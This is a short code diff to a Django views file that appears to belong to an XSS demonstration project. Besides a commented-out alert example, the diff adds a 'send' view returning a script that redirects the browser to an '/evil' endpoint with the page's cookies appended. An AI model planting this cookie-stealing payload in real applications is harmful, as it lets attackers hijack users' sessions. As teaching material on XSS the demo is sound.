@@ -16,3 +16,10 @@ def alert(request):
 
     # context = {"message": '<script>alert("XSSです")</script>'}
     # return TemplateResponse(request, "example/alert.html", context)
+
+
+@login_required
+def send(request):
+    return HttpResponse(
+        '<script>window.location = "http://0.0.0.0:8080/evil?cookie="+escape(document.cookie)</script>'
+    )
